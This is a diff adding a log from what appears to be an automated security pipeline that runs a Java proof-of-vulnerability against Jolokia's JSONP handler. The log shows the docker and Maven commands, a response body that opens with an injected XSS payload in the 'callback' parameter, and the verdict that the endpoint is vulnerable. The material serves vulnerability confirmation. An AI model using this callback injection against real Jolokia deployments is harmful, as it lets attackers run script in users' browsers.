@@ -1,0 +1,12 @@
+$ docker run --rm -v /Users/mohsen/dev/personal/autosec/security_pipeline_runs/20260717_030131_finding-cea32a9afd67/worktree:/workspace/repo -w /workspace/repo simpleautosec-finding-cea32a9afd67:c5314ac69ae9 bash -lc cd agent/core && mvn -q test-compile && mvn -q dependency:build-classpath -Dmdep.outputFile=/tmp/pov-cp.txt -Dmdep.includeScope=test && mkdir -p /tmp/pov-classes && javac -cp "target/classes:target/test-classes:$(cat /tmp/pov-cp.txt)" -d /tmp/pov-classes ../../.security-pipeline/pov/JsonpCallbackXssPov.java && java -cp "/tmp/pov-classes:target/classes:target/test-classes:$(cat /tmp/pov-cp.txt)" org.jolokia.http.JsonpCallbackXssPov
+exit_code=0
+timed_out=false
+
+--- stdout ---
+---- raw HTTP response body ----
+alert(String.fromCharCode(88,83,83))//({"request":{"mbean":"java.lang:type=Memory","attribute":"HeapMemoryUsage","type":"read"},"value":{"init":130023424,"committed":124780544,"max":1827143680,"used":13011864},"timestamp":1784254175,"status":200});
+---------------------------------
+[POV] VULNERABLE: unvalidated 'callback' parameter was written verbatim into a text/javascript response (JSONP callback XSS).
+
+--- stderr ---
+
